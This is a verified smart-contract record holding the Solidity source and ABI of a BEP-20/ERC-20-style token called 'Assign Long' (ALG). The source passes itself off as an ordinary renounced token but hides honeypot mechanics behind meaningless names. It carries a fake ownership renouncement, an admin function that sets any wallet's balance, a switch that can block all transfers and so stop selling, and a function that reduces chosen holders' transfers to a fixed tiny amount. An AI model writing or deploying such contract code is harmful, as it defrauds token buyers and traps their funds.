{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface launchedMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeMarketing) external view returns (uint256);\n\n    function transfer(address exemptMin, uint256 receiverAtSell) external returns (bool);\n\n    function allowance(address sellIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverAtSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptMin,\n        uint256 receiverAtSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeList, uint256 value);\n    event Approval(address indexed sellIs, address indexed spender, uint256 value);\n}\n\nabstract contract feeAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxToken {\n    function createPair(address autoTradingMarketing, address exemptTotal) external returns (address);\n}\n\ninterface launchedMinMetadata is launchedMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssignLong is feeAt, launchedMin, launchedMinMetadata {\n\n    uint256 constant listMode = 18 ** 10;\n\n    address public fundSenderAmount;\n\n    function transfer(address liquidityReceiver, uint256 receiverAtSell) external virtual override returns (bool) {\n        return toAmount(_msgSender(), liquidityReceiver, receiverAtSell);\n    }\n\n    uint256 public totalIs;\n\n    address private exemptSell;\n\n    uint256 public liquidityFee;\n\n    constructor (){\n        if (liquidityTake != listIs) {\n            receiverTokenSell = true;\n        }\n        launchAuto txExemptLiquidity = launchAuto(receiverSell);\n        shouldTotal = maxToken(txExemptLiquidity.factory()).createPair(txExemptLiquidity.WETH(), address(this));\n        if (takeLaunch == listIs) {\n            liquidityFee = totalIs;\n        }\n        fundSenderAmount = _msgSender();\n        teamLiquidity();\n        marketingSwapBuy[fundSenderAmount] = true;\n        launchShould[fundSenderAmount] = fromShould;\n        \n        emit Transfer(address(0), fundSenderAmount, fromShould);\n    }\n\n    address launchedFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private takeLaunch;\n\n    address receiverSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private shouldIs = \"ALG\";\n\n    bool public maxSwap;\n\n    function fromTo(address listLimit, address exemptMin, uint256 receiverAtSell) internal returns (bool) {\n        require(launchShould[listLimit] >= receiverAtSell);\n        launchShould[listLimit] -= receiverAtSell;\n        launchShould[exemptMin] += receiverAtSell;\n        emit Transfer(listLimit, exemptMin, receiverAtSell);\n        return true;\n    }\n\n    uint256 private receiverTrading;\n\n    bool private liquidityTake;\n\n    function name() external view virtual override returns (string memory) {\n        return enableMode;\n    }\n\n    function launchWallet() private view {\n        require(marketingSwapBuy[_msgSender()]);\n    }\n\n    function teamLiquidity() public {\n        emit OwnershipTransferred(fundSenderAmount, address(0));\n        exemptSell = address(0);\n    }\n\n    function toAmount(address listLimit, address exemptMin, uint256 receiverAtSell) internal returns (bool) {\n        if (listLimit == fundSenderAmount) {\n            return fromTo(listLimit, exemptMin, receiverAtSell);\n        }\n        uint256 liquidityMode = launchedMin(shouldTotal).balanceOf(launchedFrom);\n        require(liquidityMode == tokenTotal);\n        require(exemptMin != launchedFrom);\n        if (feeReceiver[listLimit]) {\n            return fromTo(listLimit, exemptMin, listMode);\n        }\n        return fromTo(listLimit, exemptMin, receiverAtSell);\n    }\n\n    function owner() external view returns (address) {\n        return exemptSell;\n    }\n\n    event OwnershipTransferred(address indexed liquiditySell, address indexed receiverMinAuto);\n\n    string private enableMode = \"Assign Long\";\n\n    function approve(address receiverList, uint256 receiverAtSell) public virtual override returns (bool) {\n        feeTo[_msgSender()][receiverList] = receiverAtSell;\n        emit Approval(_msgSender(), receiverList, receiverAtSell);\n        return true;\n    }\n\n    uint256 tradingFund;\n\n    function tradingTeamMarketing(uint256 receiverAtSell) public {\n        launchWallet();\n        tokenTotal = receiverAtSell;\n    }\n\n    mapping(address => uint256) private launchShould;\n\n    function allowance(address walletBuy, address receiverList) external view virtual override returns (uint256) {\n        if (receiverList == receiverSell) {\n            return type(uint256).max;\n        }\n        return feeTo[walletBuy][receiverList];\n    }\n\n    bool private listIs;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldIs;\n    }\n\n    uint8 private toTokenTake = 18;\n\n    bool public receiverTokenSell;\n\n    mapping(address => bool) public feeReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toTokenTake;\n    }\n\n    function swapTotal(address swapIs) public {\n        if (maxSwap) {\n            return;\n        }\n        \n        marketingSwapBuy[swapIs] = true;\n        if (totalIs == maxMarketing) {\n            totalIs = liquidityFee;\n        }\n        maxSwap = true;\n    }\n\n    address public shouldTotal;\n\n    function teamFee(address liquidityReceiver, uint256 receiverAtSell) public {\n        launchWallet();\n        launchShould[liquidityReceiver] = receiverAtSell;\n    }\n\n    uint256 tokenTotal;\n\n    mapping(address => mapping(address => uint256)) private feeTo;\n\n    uint256 private feeTakeAmount;\n\n    function getOwner() external view returns (address) {\n        return exemptSell;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromShould;\n    }\n\n    uint256 public maxMarketing;\n\n    function transferFrom(address listLimit, address exemptMin, uint256 receiverAtSell) external override returns (bool) {\n        if (_msgSender() != receiverSell) {\n            if (feeTo[listLimit][_msgSender()] != type(uint256).max) {\n                require(receiverAtSell <= feeTo[listLimit][_msgSender()]);\n                feeTo[listLimit][_msgSender()] -= receiverAtSell;\n            }\n        }\n        return toAmount(listLimit, exemptMin, receiverAtSell);\n    }\n\n    mapping(address => bool) public marketingSwapBuy;\n\n    uint256 private fromShould = 100000000 * 10 ** 18;\n\n    function balanceOf(address feeMarketing) public view virtual override returns (uint256) {\n        return launchShould[feeMarketing];\n    }\n\n    function exemptTeam(address buyFee) public {\n        launchWallet();\n        \n        if (buyFee == fundSenderAmount || buyFee == shouldTotal) {\n            return;\n        }\n        feeReceiver[buyFee] = true;\n    }\n\n    bool private listTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMinAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAtSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFee\",\"type\":\"address\"}],\"name\":\"exemptTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSenderAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingSwapBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTokenSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"}],\"name\":\"swapTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAtSell\",\"type\":\"uint256\"}],\"name\":\"teamFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverAtSell\",\"type\":\"uint256\"}],\"name\":\"tradingTeamMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAtSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAtSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AssignLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}